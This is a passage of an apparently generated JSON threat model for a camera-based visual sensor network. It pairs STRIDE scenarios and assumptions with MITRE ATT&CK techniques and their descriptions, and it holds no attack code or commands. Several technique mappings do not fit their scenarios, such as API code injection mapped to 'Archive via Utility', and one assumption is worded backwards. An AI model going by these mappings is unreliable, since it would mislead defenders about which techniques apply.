                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Unauthorized access to network using stolen credentials.",
            "Assumptions": [
                {
                    "Assumption": "Users do not follow secure password practices.",
                    "Role": "End Users",
                    "Condition": "Valid if passwords are weak and reused."
                },
                {
                    "Assumption": "Credential data is not encrypted.",
                    "Role": "System Administrator",
                    "Condition": "Valid if credential storage lacks encryption."
                },
                {
                    "Assumption": "Insufficient monitoring for suspicious login attempts.",
                    "Role": "System Administrator",
                    "Condition": "Valid if there is no monitoring in place."
                }
            ],
            "Potential Impact": "Unauthorized access could lead to data breaches and system compromise.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential theft",
                "network",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious modification of firmware on camera nodes.",
            "Assumptions": [
                {
                    "Assumption": "The firmware update process is not secure.",
                    "Role": "System Administrator",
                    "Condition": "Valid if firmware updates lack validation."
                },
                {
                    "Assumption": "Attackers have physical or remote access to the camera nodes.",
                    "Role": "Attacker",
                    "Condition": "Valid if physical security or remote access controls are weak."
                },
                {
                    "Assumption": "Firmware integrity is not verified.",
                    "Role": "System Administrator",
                    "Condition": "Valid if integrity checks are not performed."
                }
            ],
            "Potential Impact": "Compromise of device functionality and data integrity.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "device",
                "modification"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Injection of malicious code through insecure APIs.",
            "Assumptions": [
                {
                    "Assumption": "APIs do not have proper input validation.",
                    "Role": "Developer",
                    "Condition": "Valid if input validation is not enforced."
                },
                {
                    "Assumption": "APIs are not exposed to the internet without adequate security measures.",
                    "Role": "System Administrator",
                    "Condition": "Valid if adequate security measures are absent."
                },
                {
                    "Assumption": "Attackers can access API endpoints.",
                    "Role": "Attacker",
                    "Condition": "Valid if API endpoints are exposed unsafely."
                }
            ],
            "Potential Impact": "Compromise of application integrity and functionality.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "API",
                "injection",
                "code"
            ],
            "mitre_technique": {
                "name": "Archive via Utility",
                "description": "Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation: diantz.exe_lolbas) <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160) to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation: WinZip Homepage)",
                "id": "attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662",
                "technique_id": "T1560.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attacker modifies data in transit between camera nodes and central servers.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit is not encrypted.",
                    "Role": "System Administrator",
                    "Condition": "Valid if encryption is not implemented."
                },
                {
                    "Assumption": "Attackers have access to the communication channel.",
                    "Role": "Attacker",
                    "Condition": "Valid if network is not properly secured."
                },
                {
                    "Assumption": "No data integrity checks are performed on the received data.",
                    "Role": "System Administrator",
                    "Condition": "Valid if integrity checks are absent."
                }
            ],
            "Potential Impact": "Compromise of data integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data",
                "transit",
                "integrity"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "User denies uploading certain visual data collected on camera nodes.",
            "Assumptions": [
                {
                    "Assumption": "System lacks robust logging mechanisms.",
                    "Role": "System Administrator",
                    "Condition": "Valid if logging is inadequate."
                },
                {
                    "Assumption": "Logs are not tamper-proof.",
                    "Role": "System Administrator",
                    "Condition": "Valid if logs can be altered."
                },
                {
                    "Assumption": "Users have legitimate access to modify or delete logs.",
                    "Role": "End Users",
                    "Condition": "Valid if users have more access than necessary."
                }
            ],
            "Potential Impact": "Compromise of data integrity and accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "accountability",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Administrator denies performing unauthorized access or changes in the system.",
            "Assumptions": [
                {
                    "Assumption": "Administrative activities are not logged.",
                    "Role": "System Administrator",
                    "Condition": "Valid if no logging practices are implemented."
                },
                {
                    "Assumption": "Administrators have the ability to modify logs.",
                    "Role": "System Administrator",
                    "Condition": "Valid if logs are not protected."
                },
                {
                    "Assumption": "Logs are stored insecurely and can be tampered with.",
                    "Role": "System Administrator",
                    "Condition": "Valid if log storage lacks security."
                }
            ],
            "Potential Impact": "Lack of accountability and traceability for administrative actions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "administrator",
                "logging",
                "access"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Employee disputes accessing sensitive data or network resources.",
            "Assumptions": [
                {
                    "Assumption": "Access to sensitive data is not logged.",
                    "Role": "System Administrator",
                    "Condition": "Valid if logging is inadequate."
                },
                {
                    "Assumption": "Logs of access activities are not secured or audited.",
                    "Role": "System Administrator",
                    "Condition": "Valid if log security and audits are absent."
                },
                {
                    "Assumption": "Users have elevated privileges allowing them to alter logs.",
                    "Role": "System Administrator",
                    "Condition": "Valid if user privileges are improper."
                }
            ],
            "Potential Impact": "Compromise of data integrity and non-repudiation.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "employee",
                "sensitive data",
                "access"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to visual data stored on the camera nodes.",
            "Assumptions": [
                {
                    "Assumption": "Data at rest is not encrypted.",
                    "Role": "System Administrator",
                    "Condition": "Valid if encryption is not implemented."
                },
                {
                    "Assumption": "Access controls are insufficient.",
                    "Role": "System Administrator",
                    "Condition": "Valid if access control mechanisms are weak."
                },
                {
                    "Assumption": "Attackers have physical access to camera nodes.",
                    "Role": "Attacker",
                    "Condition": "Valid if physical security is lacking."
                }
            ],
            "Potential Impact": "Compromise of data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data",
                "access",
                "confidentiality"
            ],
            "mitre_technique": {
                "name": "Data from Configuration Repository",
                "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
                "id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
                "technique_id": "T1602"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive visual data is intercepted during transmission over the network.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit is not encrypted.",
                    "Role": "System Administrator",
                    "Condition": "Valid if encryption is not implemented."
                },
                {
                    "Assumption": "The network is accessible to potential attackers.",
                    "Role": "Attacker",
                    "Condition": "Valid if network security is insufficient."
                },
                {
                    "Assumption": "There are no monitoring mechanisms for network traffic.",
                    "Role": "System Administrator",
                    "Condition": "Valid if monitoring is absent."
                }
            ],
            "Potential Impact": "Compromise of data confidentiality and integrity.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network",
                "transmission",
                "confidentiality"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Exposed endpoints or unsecured APIs leading to unauthorized data access.",
            "Assumptions": [
                {
                    "Assumption": "APIs lack proper authentication mechanisms.",
                    "Role": "Developer",
                    "Condition": "Valid if authentication is weak."
                },
                {
                    "Assumption": "API endpoints are accessible from untrusted networks.",
                    "Role": "System Administrator",
                    "Condition": "Valid if network access controls are inadequate."
                },
                {
                    "Assumption": "APIs do not implement rate limiting.",
                    "Role": "Developer",
                    "Condition": "Valid if APIs are susceptible to brute-force attacks."
                }
            ],
            "Potential Impact": "Unauthorized access and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "API",
                "data access",
                "confidentiality"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attacks targeting the Visual Sensor Network.",
            "Assumptions": [
                {
                    "Assumption": "Network lacks mitigation mechanisms against DDoS attacks.",
                    "Role": "System Administrator",
                    "Condition": "Valid if DDoS protections are not implemented."
                },
                {
                    "Assumption": "Attackers have sufficient resources to launch a DDoS attack.",
                    "Role": "Attacker",
                    "Condition": "Valid if attackers have access to botnets or similar resources."
                },
                {
                    "Assumption": "No real-time monitoring of network traffic.",
                    "Role": "System Administrator",
                    "Condition": "Valid if network monitoring is not in place."
                }
            ],
            "Potential Impact": "Disruption of service availability and network operations.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "network",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Resource exhaustion on camera nodes due to excessive requests.",
            "Assumptions": [
                {
                    "Assumption": "Cameras lack rate limiting mechanisms.",
                    "Role": "Developer",
                    "Condition": "Valid if rate limiting is not implemented."
                },
                {
                    "Assumption": "Attackers can generate high volumes of requests.",
                    "Role": "Attacker",
                    "Condition": "Valid if attack tools are available."
                },
                {
                    "Assumption": "System does not monitor for abnormal traffic patterns.",
                    "Role": "System Administrator",
                    "Condition": "Valid if traffic monitoring is weak."
                }
            ],
            "Potential Impact": "Depletion of resources leading to unavailability of camera nodes.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "resource exhaustion",
                "camera nodes",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Tampered or malicious firmware updates causing service outages.",
            "Assumptions": [
                {
                    "Assumption": "Firmware updates are not verified for integrity.",
                    "Role": "System Administrator",
                    "Condition": "Valid if integrity checking is absent."
                },
                {
                    "Assumption": "Automatic updates are enabled without manual oversight.",
                    "Role": "System Administrator",
                    "Condition": "Valid if updates are not reviewed."
                },
                {
                    "Assumption": "No rollback mechanism for firmware updates.",
                    "Role": "System Administrator",
                    "Condition": "Valid if rollback is not implemented."
                }
            ],
            "Potential Impact": "Introduction of defective firmware causing device malfunctions and service disruptions.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "firmware",
                "update",
                "service outage"
            ],
            "mitre_technique": {
                "name": "System Firmware",
                "description": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation: About UEFI)\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
                "id": "attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada",
                "technique_id": "T1542.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of vulnerabilities in the Linux kernel used by the IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "Devices run outdated or vulnerable versions of Linux kernel.",
                    "Role": "System Administrator",
                    "Condition": "Valid if kernel updates are neglected."
                },
                {
                    "Assumption": "Attackers have access to exploit code for known vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid if exploit code is publicly available."
                },
                {
                    "Assumption": "No intrusion detection/prevention systems in place.",
                    "Role": "System Administrator",
                    "Condition": "Valid if IDS/IPS are not implemented."
                }
            ],
            "Potential Impact": "Gain of unauthorized privileges leading to system compromise and potential full control.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "Linux kernel",
                "exploitation",
                "system compromise"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malicious scripts exploiting configuration errors or software bugs to gain admin access.",
            "Assumptions": [
                {
                    "Assumption": "System has misconfigurations or software bugs.",
                    "Role": "System Administrator",
                    "Condition": "Valid if software is not regularly audited."
                },
                {
                    "Assumption": "Attackers have knowledge of system configurations.",
                    "Role": "Attacker",
                    "Condition": "Valid if configuration details are exposed."
                },
                {
                    "Assumption": "No regular security patching is conducted.",
                    "Role": "System Administrator",
                    "Condition": "Valid if patch management is inadequate."
                }
            ],
            "Potential Impact": "Elevation of privileges leading to potential unauthorized administrative actions.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "scripts",
                "configuration errors",
                "admin access"
            ],
            "mitre_technique": {
                "name": "Boot or Logon Initialization Scripts",
                "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
                "id": "attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334",
                "technique_id": "T1037"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Use of compromised lower-privileged accounts to gain access to higher-privileged functionalities.",
            "Assumptions": [
                {
                    "Assumption": "Access controls are not properly enforced for privilege separation.",
                    "Role": "System Administrator",
                    "Condition": "Valid if access control models are weak."
                },
                {
                    "Assumption": "Attackers can bypass authentication mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Valid if security mechanisms are flawed."
                },
                {
                    "Assumption": "No monitoring for unusual activities for lower-privileged accounts.",
                    "Role": "System Administrator",
                    "Condition": "Valid if activity monitoring is not enforced."
                }
            ],
            "Potential Impact": "Gain of unauthorized higher privileges leading to misuse of administrative functionalities.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "account compromise",
                "access control",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
